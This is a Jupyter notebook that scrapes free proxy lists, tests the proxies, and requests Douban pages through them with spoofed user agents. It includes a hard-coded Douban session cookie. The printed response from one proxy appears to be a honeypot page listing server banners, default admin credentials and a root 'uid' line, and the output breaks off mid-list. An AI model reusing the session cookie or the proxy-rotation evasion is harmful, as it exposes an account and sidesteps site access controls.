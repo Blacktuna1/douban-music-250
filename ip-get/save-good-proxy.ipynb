{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Scraping Pages:   0%|          | 0/2 [00:00<?, ?it/s]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "111.225.153.119:8089\n",
      "{'proxy': '111.225.153.119:8089', 'enable': '不可用'}\n",
      "{'proxy': '42.63.65.110:80', 'enable': '不可用'}\n",
      "{'proxy': '223.111.245.183:80', 'enable': '不可用'}\n",
      "47.100.254.82:80 \u001b[31m可用\u001b[0m\n",
      "{'proxy': '114.232.109.59:8888', 'enable': '不可用'}\n",
      "{'proxy': '183.164.243.55:8089', 'enable': '不可用'}\n",
      "{'proxy': '117.69.236.223:8089', 'enable': '不可用'}\n",
      "{'proxy': '117.69.232.194:8089', 'enable': '不可用'}\n",
      "{'proxy': '36.6.144.144:8089', 'enable': '不可用'}\n",
      "{'proxy': '60.28.196.209:80', 'enable': '不可用'}\n",
      "{'proxy': '120.27.140.17:80', 'enable': '不可用'}\n",
      "{'proxy': '114.102.45.224:8089', 'enable': '不可用'}\n",
      "111.225.152.222:8089 \u001b[31m可用\u001b[0m\n",
      "{'proxy': '42.63.65.46:80', 'enable': '不可用'}\n",
      "{'proxy': '42.63.65.66:80', 'enable': '不可用'}\n",
      "{'proxy': '114.231.8.72:8089', 'enable': '不可用'}\n",
      "{'proxy': '61.160.202.101:80', 'enable': '不可用'}\n",
      "{'proxy': '117.69.232.224:8089', 'enable': '不可用'}\n",
      "{'proxy': '60.188.5.138:80', 'enable': '不可用'}\n",
      "{'proxy': '36.6.144.237:8089', 'enable': '不可用'}\n",
      "{'proxy': '221.194.146.167:80', 'enable': '不可用'}\n",
      "{'proxy': '114.106.146.137:8089', 'enable': '不可用'}\n",
      "{'proxy': '101.37.30.185:80', 'enable': '不可用'}\n",
      "{'proxy': '36.6.145.243:8089', 'enable': '不可用'}\n",
      "{'proxy': '114.231.45.165:8888', 'enable': '不可用'}\n",
      "111.59.4.88:9002 \u001b[31m可用\u001b[0m\n",
      "111.177.63.86:8888 \u001b[31m可用\u001b[0m\n",
      "{'proxy': '117.70.49.128:8089', 'enable': '不可用'}\n",
      "{'proxy': '121.41.55.176:80', 'enable': '不可用'}\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Scraping Pages: 100%|██████████| 2/2 [01:23<00:00, 41.67s/it]"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'proxy': '39.173.106.248:80', 'enable': '不可用'}\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "from fake_useragent import UserAgent\n",
    "ua = UserAgent()\n",
    "import time\n",
    "import random\n",
    "from bs4 import BeautifulSoup\n",
    "import pandas as pd\n",
    "from tqdm import tqdm  # 导入 tqdm\n",
    "\n",
    "df_temp = pd.read_csv(r'C:\\Users\\10378\\Desktop\\project\\24-1\\douban-music-250\\ip_enable.csv')\n",
    "proxy_list = df_temp['proxy'].to_list()\n",
    "\n",
    "df = pd.DataFrame(columns=['proxy', 'enable'])\n",
    "test_url = 'http://www.baidu.com'\n",
    "\n",
    "headers = {'User-Agent': UserAgent().random}\n",
    "\n",
    "#                      参数 IP 地址\n",
    "def test_proxy(proxy):\n",
    "    '''测试代理IP是否可用'''\n",
    "    proxies__ = {\n",
    "        'http': 'http://{}'.format(proxy),\n",
    "        'https': 'https://{}'.format(proxy),\n",
    "    }\n",
    "    # 参数类型\n",
    "    # proxies\n",
    "    # proxies = {'协议': '协议://IP:端口号'}\n",
    "    # timeout 超时设置 网页响应时间3秒 超过时间会抛出异常\n",
    "    try:\n",
    "        resp = requests.get(url=test_url, proxies=proxies__, headers=headers, timeout=3)\n",
    "        # 查看状态码   \n",
    "        if resp.status_code == 200:\n",
    "            print(proxy, '\\033[31m可用\\033[0m')\n",
    "            return '{},可用'.format(proxy)\n",
    "            \n",
    "        else:\n",
    "            return '{},不可用'.format(proxy)\n",
    "\n",
    "    except Exception as e:\n",
    "        return '{},不可用'.format(proxy)\n",
    "\n",
    "\n",
    "def get_ip(url,headers):\n",
    "    response = requests.get(url,headers=headers)\n",
    "\n",
    "    soup = BeautifulSoup(response.text, 'html.parser')\n",
    "\n",
    "    proxies = []\n",
    "    for tr in soup.find_all('tr')[1:]:\n",
    "        tds = tr.find_all('td')\n",
    "        proxy = tds[0].text.strip() + ':' + tds[1].text.strip()\n",
    "        proxies.append(proxy)\n",
    "    return proxies\n",
    "\n",
    "\n",
    "sum = 1\n",
    "\n",
    "def fillProxy(i):\n",
    "    headers = {\n",
    "    'User-Agent' : ua.random,\n",
    "    'referer':'https://www.google.com'\n",
    "    }\n",
    "    url = 'https://www.89ip.cn/index_{}.html'.format(i)\n",
    "    # url = 'https://www.89ip.cn/index_{}.html'.format(i)\n",
    "    # 爬一半休息一下\n",
    "    if(i == 24):\n",
    "        time.sleep(random.uniform(30,60))\n",
    "    ## 休息\n",
    "    time.sleep(random.uniform(3, 6))\n",
    "    \n",
    "    random_num = random.randint(0,24)\n",
    "    \n",
    "\n",
    "    proxies = {\n",
    "        'http': 'http://{}'.format(proxy_list[random_num]),\n",
    "        'https': 'http://{}'.format(proxy_list[random_num]),\n",
    "    }   \n",
    "    try:\n",
    "        global sum \n",
    "        if(sum == 5):\n",
    "            print('超过重试次数')\n",
    "            return None\n",
    "        else:\n",
    "            proxies_data = get_ip(url,headers=headers)\n",
    "            print(proxies_data[0])\n",
    "\n",
    "    except Exception as e:\n",
    "        # 处理其他异常\n",
    "        print(f'第{i}页第{sum}次异常')\n",
    "        print(e)\n",
    "        sum = sum + 1 \n",
    "\n",
    "        fillProxy(i)\n",
    "    else:\n",
    "        sum = 1\n",
    "    # 循环追加数据\n",
    "    for i in proxies_data:\n",
    "        date_proxy = test_proxy(i).split(\",\")\n",
    "        if(date_proxy[1] == '不可用'):\n",
    "            data = {'proxy': date_proxy[0], 'enable': date_proxy[1]}\n",
    "            print(data)\n",
    "            global df\n",
    "            df = df.append(data,ignore_index=True)\n",
    "\n",
    "for i in tqdm(range(2), desc=\"Scraping Pages\"):\n",
    "    if(i==0):\n",
    "        continue\n",
    "    try: \n",
    "        fillProxy(i)\n",
    "    except Exception as e:\n",
    "        continue\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>proxy</th>\n",
       "      <th>enable</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>111.225.153.119:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>42.63.65.110:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>223.111.245.183:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>114.232.109.59:8888</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>183.164.243.55:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>117.69.236.223:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>117.69.232.194:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>36.6.144.144:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>60.28.196.209:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>120.27.140.17:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>114.102.45.224:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>42.63.65.46:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>42.63.65.66:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>114.231.8.72:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>61.160.202.101:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>117.69.232.224:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>60.188.5.138:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>36.6.144.237:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>221.194.146.167:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>114.106.146.137:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>101.37.30.185:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>36.6.145.243:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>114.231.45.165:8888</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>117.70.49.128:8089</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>121.41.55.176:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>39.173.106.248:80</td>\n",
       "      <td>不可用</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                   proxy enable\n",
       "0   111.225.153.119:8089    不可用\n",
       "1        42.63.65.110:80    不可用\n",
       "2     223.111.245.183:80    不可用\n",
       "3    114.232.109.59:8888    不可用\n",
       "4    183.164.243.55:8089    不可用\n",
       "5    117.69.236.223:8089    不可用\n",
       "6    117.69.232.194:8089    不可用\n",
       "7      36.6.144.144:8089    不可用\n",
       "8       60.28.196.209:80    不可用\n",
       "9       120.27.140.17:80    不可用\n",
       "10   114.102.45.224:8089    不可用\n",
       "11        42.63.65.46:80    不可用\n",
       "12        42.63.65.66:80    不可用\n",
       "13     114.231.8.72:8089    不可用\n",
       "14     61.160.202.101:80    不可用\n",
       "15   117.69.232.224:8089    不可用\n",
       "16       60.188.5.138:80    不可用\n",
       "17     36.6.144.237:8089    不可用\n",
       "18    221.194.146.167:80    不可用\n",
       "19  114.106.146.137:8089    不可用\n",
       "20      101.37.30.185:80    不可用\n",
       "21     36.6.145.243:8089    不可用\n",
       "22   114.231.45.165:8888    不可用\n",
       "23    117.70.49.128:8089    不可用\n",
       "24      121.41.55.176:80    不可用\n",
       "25     39.173.106.248:80    不可用"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>proxy</th>\n",
       "      <th>enable</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>115.29.149.2:111</td>\n",
       "      <td>可用</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "              proxy enable\n",
       "0  115.29.149.2:111     可用"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "temp = {'proxy': '115.29.149.2:111', 'enable': '可用'}\n",
    "df = df.append(temp,ignore_index=True)\n",
    "df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "test"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "14"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "random_num = random.randint(0,24)\n",
    "random_num"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_temp = df.copy()\n",
    "df_temp.to_csv('ip_enable.csv')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 25 entries, 0 to 24\n",
      "Data columns (total 2 columns):\n",
      " #   Column  Non-Null Count  Dtype \n",
      "---  ------  --------------  ----- \n",
      " 0   proxy   25 non-null     object\n",
      " 1   enable  25 non-null     object\n",
      "dtypes: object(2)\n",
      "memory usage: 528.0+ bytes\n"
     ]
    }
   ],
   "source": [
    "df_temp = pd.read_csv(r'C:\\Users\\10378\\Desktop\\project\\24-1\\douban-music-250\\ip_enable.csv')\n",
    "proxy_list = df_temp['proxy'].to_list()\n",
    "df_temp.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "get_ip()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['123.56.129.203:3333',\n",
       " '121.37.201.60:8080',\n",
       " '47.109.46.223:5678',\n",
       " '116.63.130.30:8889',\n",
       " '120.79.7.173:6379',\n",
       " '139.129.231.228:8060',\n",
       " '139.196.151.191:1081',\n",
       " '120.79.21.48:8089',\n",
       " '120.79.31.133:20201',\n",
       " '121.37.205.253:8499',\n",
       " '124.71.157.181:8081',\n",
       " '139.224.56.162:8499',\n",
       " '116.63.130.30:7890',\n",
       " '118.195.242.20:8080',\n",
       " '116.63.130.30:7890',\n",
       " '118.195.242.20:8080',\n",
       " '121.40.160.67:80',\n",
       " '121.40.160.67:80',\n",
       " '121.40.223.55:80',\n",
       " '121.40.223.55:80',\n",
       " '123.57.1.78:1081',\n",
       " '101.200.187.233:8090',\n",
       " '123.57.1.78:1081',\n",
       " '101.200.187.233:8090',\n",
       " '120.55.49.231:6969']"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "proxy_list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<Response [401]>\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    " \n",
    "ua = UserAgent()\n",
    "\n",
    "url = 'http://movie.douban.com/chart'\n",
    "\n",
    "headers = {\n",
    "  'User-Agent' : ua.random,\n",
    "  'Cookie' : 'bid=7jMbx9dPdaQ; _pk_id.100001.8cb4=a7946c71eb43fa5a.1704355272.; __yadk_uid=pJcNNEOBRjAhtu4CZ1Q12ybt5zBO4GOd; douban-fav-remind=1; ll=\"118281\"; __utmz=30149280.1704687821.2.2.utmcsr=cn.bing.com|utmccn=(referral)|utmcmd=referral|utmcct=/; viewed=\"10785583\"; __utmc=30149280; _pk_ref.100001.8cb4=%5B%22%22%2C%22%22%2C1705398553%2C%22https%3A%2F%2Fcn.bing.com%2F%22%5D; _pk_ses.100001.8cb4=1; __utma=30149280.669718913.1704355273.1705369750.1705398553.6; __utmt=1; __utmb=30149280.2.10.1705398553; ap_v=0,6.0; dbcl2=\"177340493:/1rnLRV8PEc\"; ck=K3gX; push_noty_num=0; push_doumail_num=0'\n",
    "}\n",
    "\n",
    "proxies = {\n",
    "    'http': 'http://{}'.format(proxy_list[4]),\n",
    "    'https': 'http://{}'.format(proxy_list[4]),\n",
    "}\n",
    "\n",
    "response = requests.get(url, proxies=proxies)\n",
    "\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!DOCTYPE html>\\n<html>\\n<head>\\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\\n<meta http-equiv=\"Pragma\" content=\"no-cache\" />\\n<meta charset=\"utf-8\">\\n<meta content=\"IE=edge\" http-equiv=\"X-UA-Compatible\">\\n<meta content=\"object\" property=\"og:type\">\\n<meta content=\"GitLab\" property=\"og:site_name\">\\n<meta content=\"Help\" property=\"og:title\">\\n<meta content=\"GitLab Community Edition\" property=\"og:description\">\\n<meta content=\"summary\" property=\"twitter:card\">\\n<meta content=\"Help\" property=\"twitter:title\">\\n<meta content=\"GitLab Community Edition\" property=\"twitter:description\">\\n<meta content=\"GitLab Community Edition\" name=\"description\">\\n<meta content=\"#474D57\" name=\"theme-color\">\\n<meta content=\"#30353E\" name=\"msapplication-TileColor\">\\n<meta name=\"csrf-param\" content=\"authenticity_token\" />\\n<meta name=\"csrf-token\" content=\"Rm9yIGludGVnZXJzLCB0aGVyZSBpcyB1bmlmb3JtIHNlbGVjdGlvbiBmcm9tIGEgcmFuZ2UuIEZvciBzZXF1ZQ==\" />\\n<title>Rain</title>\\n</head>\\n<body>\\n<p hidden=\"hidden\">\\n<!--\\n<TITLE>Login</TITLE>\\n<a href=\"jpg.html\">LIVE JPEG</a><br>\\n<a href=\"liveie.html\">Internet Monitor (Microsoft Internet Explorer 8, 9, 10, 11) </a><br>\\n<a href=\"DVRRemoteAP.exe\">Download 32 bits DVR Client (Windows 7, Windows 8, Windows 10)</a><br>\\n<a href=\"DVRRemoteAP_X64.exe\">Download 64 bits DVR Client (Windows 7, Windows 8, Windows 10)</a><br>\\n<a href=\"DVFPlayer.zip\">Download 32/64 bits File Player (Windows 7, Windows 8, Windows 10)</a><br>\\n<\\\\?xml version=\"1.0\" encoding=\"utf-8\"?><base64Binary xmlns=\"http://micros-hosting.com/EGateway/\">\\nLocation: /admin\\n<meta name=\"generator\" content=\"vBulletin 5.5.4\" />\\nLocation: http://116.63.130.30:80/relogin.htm?_t=3541144909\\nLocation: http://116.63.130.30:80/syscmd.htm\"\\nLocation: /ui/login\\n/cgi-bin/webctrl.cgi?action=index_page\\n<HTML><HEAD><TITLE>302 Moved</TITLE></HEAD><BODY><H1>302 Moved</H1>.The document has moved<A HREF=\"http://116.63.130.30:80/relogin.htm?_t=179439949\">here</A></BODY></HTML>\\n<link type=\"image/x-icon\" rel=\"shortcut icon\" href=\"/themes/img/icon/cisco_shortcut.png\">\\n<link type=\"image/x-icon\" rel=\"shortcut icon\" href=\"/themes/img/icon/cisco_logo.png\">\\n<td class=\"Copyright\" colspan=\"2\" style=\"text-align:justify\" height=\"20\" valign=\"bottom\">Â© 2017 Cisco Systems, Inc. All Rights Reserved.\\n<br>Cisco, Cisco Systems, and the Cisco Systems logo are registered\\ntrademarks or trademarks of Cisco Systems, Inc. and/or it\\'s affiliates\\nin the United States and certain other countries.\\n</td>\\nSSH key is good\\nis not a valid ref and may not be archived\\npcPassword2\\n\\'&sessionKey=790148060;\\'\\nname=\"sessionKey\" value=\"790148060\"\\nvar fgt_lang = /dev/cmdb/sslvpn_websession\\nphp 8.1.0-dev exit\\nspringframework\\nTomcat\\nDEVICE.ACCOUNT=admin\\nAUTHORIZED_GROUP=1\\n<uid></uid>\\n<name>Admin</name>\\n<usrid></usrid>\\n<password>admin</password>\\n<group></group>\\ncpto /tmp/\"root\"\\nModel=AC1450\\r\\nFirmware=V1.0.0.36_10.0.17\\r\\n\"exceptionMessageValue\":\"javax.servlet.ServletException: No valid forensics analysis solrDocIds parameter found.\"\\nBIG-IP release 15.0.0\\nuser:root\\n12345admin123\\'\\nFailed to process image\\n\\nLocation: http://192.168.0.1:52869/picsdesc.xml\\nYou don\\'t have permission to access /vpns/ on this server.\\n[global]\\n    workgroup = intranet\\n    encrypt passwords = Yes\\n    update encrypted = Yes\\n\\nfuncionando\\nsystem_sofia\\nname resolve order\\nInfoOS:Linux node01 uid=0(root) gid=0(root) groups=0(root)OSInfo\\n<h1> x0HunT3r </h1>\\n<b>File Uploaded !!!</b><br>\\nant=951d11e51392117311602d0c25435d7f\\n38ee63071a04dc5e04ed22624c38e648\\n6f3249aa304055d63828af3bfab778f6\\n\"Powered by vBulletin Version 5.5.4\"\\n789551\\nLinear eMerge\\nSuperSign\\nubiq\\nYacht\\nZeroshell\\nFastWeb\\nAuthInfo:\\nloadingIndicator_bk\\nZyxel\\nskyrouter\\nWAP54\\n\\n\\nServer: ver2.4 rev0\\nServer: PDR-Jseries\\nServer: istio-envoy\\nServer: IPCamera-Webs/2.5.0 PeerSec-MatrixSSL/3.1.3-OPEN\\nServer: Unkown\\nServer: TP-LINK Router\\nServer: ************\\nServer: K1\\nServer: K2\\nServer: K2P\\nServer: K3\\nServer: Ruijie Servrer\\nServer: \\nServer: -\\nServer: 15dbd20f-7fc0-910a-349c-94a3d569e732\\nServer: pve-api-daemon/3.0\\nServer: 2.2.23\\nServer: 3S_WebServer\\nServer: 4D/18.3.0\\nServer: 4fd7d672-bbd6-f059-9dff-51e02d6e25ee\\nServer: 58f5b853-36b6-597e-16c6-4610e7fd83a4\\nServer: ADB Broadband HTTP Server\\nServer: APN HTTPD V1.4\\nServer: AR\\nServer: ATS/7.0.0\\nServer: Abyss/2.7.0.0-X1-Win32 AbyssLib/2.7.0.0\\nServer: Abyss/2.8.0.5-X2/B2-Win32 AbyssLib/2.8.0.1\\nServer: Ag [47]\\nServer: AirTunes/377.30.01\\nServer: AkamaiGHost\\nServer: Apache\\nServer: Apache-Coyote/1.1\\nServer: Apache/1.3.28 (Unix) mod_ssl/2.8.15 OpenSSL/0.9.8d\\nServer: Apache/1.3.31 (Unix)\\nServer: Apache/2.0.43 (Win32) mod_jk/1.2.2-beta-1\\nServer: Apache/2.2.0 (Unix) mod_ssl/2.2.0 OpenSSL/0.9.7g PHP/5.1.1\\nServer: Apache/2.2.9 (Win32) DAV/2 mod_ssl/2.2.9 OpenSSL/0.9.8i mod_autoindex_color PHP/5.2.6\\nServer: Apache/2.4.12 (Win32) OpenSSL/1.0.1l PHP/5.6.8\\nServer: Apache/2.4.29 (Ubuntu)\\nServer: Apache/2.4.9 (Win32) OpenSSL/1.0.1g PHP/5.5.11\\nServer: App-webs/\\nServer: Arcadyan httpd 1.0\\nServer: Asterisk/1.8.9\\nServer: Astra\\nServer: AutobahnPython/21.3.1\\nServer: AvigilonGateway/1.0 Microsoft-HTTPAPI/2.0\\nServer: B&R Web Server  Ver. {2-250416-25}\\nServer: BRCM HTTP Server\\nServer: BarracudaHTTP 4.0\\nServer: BaseHTTP/0.3 Python/2.7.10\\nServer: BaseHTTP/0.3 Python/2.7.17\\nServer: BaseHTTP/0.3 Python/2.7.5\\nServer: Beaver\\nServer: BigIP\\nServer: BlueIris-HTTP/1.1\\nServer: BlueServer/4.8.6.3\\nServer: BlueServer/5.1.0.4\\nServer: BlueServer/5.5.4.1\\nServer: Boa/0.93.15\\nServer: Boa/0.94.11\\nServer: Boa/0.94.13\\nServer: Boa/0.94.14\\nServer: Boa/0.94.14rc19\\nServer: Boa/0.94.14rc20\\nServer: Boa/0.94.14rc21\\nServer: CJServer/1.1\\nServer: CPE-SERVER/1.0 Supports only GET\\nServer: CSI Web Server 1.05\\nServer: CUPS/2.2 IPP/2.1\\nServer: CVM\\nServer: Caddy\\nServer: Caddy v0.11.1\\nServer: Cambium HTTP Server\\nServer: Cassini/5.0.4.0\\nServer: CenteHTTPd/1.1\\nServer: Check Point SVN foundation\\nServer: CherryPy/10.2.2\\nServer: CherryPy/3.1.2 WSGI Server\\nServer: CherryPy/3.2.2\\nServer: CherryPy/3.2.5\\nServer: CherryPy/4.0.0\\nServer: CherryPy/8.6.0\\nServer: Cimer\\nServer: Cisco-CcspCwmpTcpCR/1.0\\nServer: Citrix Web PN Server\\nServer: Clayster.Library.Internet/1.1\\nServer: Cloud\\nServer: CloudFront\\nServer: Contiki/2.4 http://www.sics.se/contiki/\\nServer: Coruscant\\nServer: CouchDB/2.1.0 (Erlang OTP/17)\\nServer: Cougar/9.01.01.3841\\nServer: Cowboy\\nServer: Cross Web Server\\nServer: CuteBi Network Tunnel, (%>w<%)\\nServer: DGuard Center 7.1.6.9\\nServer: DIR-825 web server/v1.00\\nServer: DNVRS-Webs\\nServer: DOSarrest\\nServer: DS67x0\\nServer: DVRDVS-Webs\\nServer: DWS\\nServer: DasanNetwork Solution\\nServer: David-WebBox/12.00a (1291) WIN32\\nServer: Destiny\\nServer: Docker/1.10.3 (linux)\\nServer: Docker/1.11.1 (linux)\\nServer: Docker/17.03.0-ce (linux)\\nServer: Docker/17.03.3-ce (linux)\\nServer: Docker/18.09.4 (linux)\\nServer: Docker/19.03.8 (linux)\\nServer: Docker/19.03.9 (linux)\\nServer: Docker/20.10.2 (linux)\\nServer: Docker/20.10.6 (linux)\\nServer: Dr.COM Server\\nServer: E2EE Server 2.0\\nServer: E2EE WebSocket Server/0.7.0\\nServer: EZproxy\\nServer: Easy-html\\nServer: Embedded HTTP Server.\\nServer: Embedthis-Appweb/3.2.3\\nServer: Embedthis-Appweb/3.3.1\\nServer: Embedthis-Appweb/3.4.2\\nServer: Embedthis-http/4.0.0\\nServer: Eudemon Auth-Http Server 1.0\\nServer: FC03-HTTPS\\nServer: FlowWeb/1.4.28\\nServer: GEM ver1\\nServer: GW\\nServer: GWS/100.0\\nServer: GeoHttpServer\\nServer: GeoWebServer 5.0.0.0\\nServer: Gerenciado por StoreHosting.com.br\\nServer: GlassFish Server Open Source Edition  4.0\\nServer: GlassFish Server Open Source Edition  4.1\\nServer: GlassFish Server Open Source Edition  4.1.1\\nServer: GlassFish Server Open Source Edition  4.1.2\\nServer: Gnway Web Server\\nServer: GoAhead-Webs\\nServer: GoAhead-Webs/2.5.0\\nServer: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.1.3-OPEN\\nServer: GoAhead-Webs/2.5.0 PeerSec-MatrixSSL/3.4.2-OPEN\\nServer: GoAhead-http\\nServer: GoAheadWebs\\nServer: GoOryx/1.0.5\\nServer: Google Web\\nServer: H264DVR 1.0\\nServer: H3C-CVM\\nServer: H3C-CVM\\t5049\\nServer: H3C-Miniware-Webs\\nServer: HFS 2.1 beta17\\nServer: HFS 2.2e\\nServer: HFS 2.3 beta\\nServer: HFS 2.3c\\nServer: HFS 2.4.0 RC6\\nServer: HFS 2.4.0 RC7\\nServer: HFS 2.4rc2\\nServer: HID-Web\\nServer: HP HTTP Server; HP ENVY 7640 series - E4W43A; Serial Number: TH73P4S0Q0063T; Built:Tue May 26, 2020 07:08:30AM {NSM2CN2022AR}\\nServer: HP HTTP Server; HP HP OfficeJet Pro 8720 - D9L19A; Serial Number: CN81HC6060; Built:Wed Jan 27, 2021 02:31:26PM {WMP1CN2105AR}\\nServer: HP-iLO-Server/1.30\\nServer: HTTP Server\\nServer: HTTP Server 1.0\\nServer: HTTPD\\nServer: HTTPD 1.0\\nServer: HTTPD_gw 1.0\\nServer: Hanlong Unicron v1.0\\nServer: Henry/1.1\\nServer: Hikvision-Webs\\nServer: Hipcam\\nServer: HtNanoHttpd\\nServer: Http Server\\nServer: Httpd\\nServer: Httpd/1.0\\nServer: Huawei Auth-Http Server 1.0\\nServer: IBM_HTTP_Server\\nServer: INTELEKTRON WEB SERVER\\nServer: IS2 Web Server 1.36\\nServer: IST OIS\\nServer: IceWarp/12.0.2.0 x64\\nServer: Icecast 2.4.2\\nServer: Icecast 2.4.4\\nServer: IdeaWebServer/0.83.415\\nServer: Indy/10.0.52\\nServer: Indy/9.0.11\\nServer: Indy/9.00.10\\nServer: Infra911\\nServer: Intel(R) Active Management Technology 9.1.30\\nServer: Intoto Http Server v1.0\\nServer: JAWS/1.0 